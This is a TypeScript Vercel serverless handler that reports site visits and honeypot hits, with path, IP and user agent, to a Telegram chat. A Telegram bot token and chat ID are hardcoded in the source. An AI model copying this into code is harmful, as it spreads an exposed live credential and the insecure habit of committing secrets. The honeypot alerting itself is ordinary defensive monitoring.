import type { VercelRequest, VercelResponse } from '@vercel/node';

const TELEGRAM_TOKEN = '8205366262:AAEiaUGX8aZ7xjMwhEEdPIcJfBaBaFRQoxw';
const CHAT_ID = '7620121995';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // Allow only POST or GET
  if (req.method !== 'POST' && req.method !== 'GET') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { type, ip, userAgent, path } = req.body || req.query;

  let message = '';

  if (type === 'heartbeat') {
    // Only log, maybe too noisy for Telegram if high traffic. 
    // For now, we return 200 OK. 
    // In a real app, we would store this in Redis/KV.
    return res.status(200).json({ status: 'alive', timestamp: Date.now() });
  } 
  
  if (type === 'honeypot') {
    message = `🚨 *SECURITY ALERT: HONEYPOT TRIGGERED* %0A%0A` +
              `📍 Path: \`${path || 'Unknown'}\`%0A` +
              `🕵️ IP: \`${ip || req.headers['x-forwarded-for'] || 'Unknown'}\`%0A` +
              `🤖 User-Agent: \`${userAgent || req.headers['user-agent'] || 'Unknown'}\`%0A` +
              `⚠️ Action: Potential Scanner/Bot detected.`;
  } else {
    // Generic Visit
    message = `👤 *NEW VISITOR DETECTED* %0A%0A` +
              `📍 Page: \`${path || 'Home'}\`%0A` +
              `🕵️ IP: \`${req.headers['x-forwarded-for'] || 'Unknown'}\`%0A` +
              `🕒 Time: ${new Date().toISOString()}`;
  }

  try {
    // Send to Telegram
    if (message) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram Error:', error);
    return res.status(500).json({ error: 'Failed to notify' });
  }
}
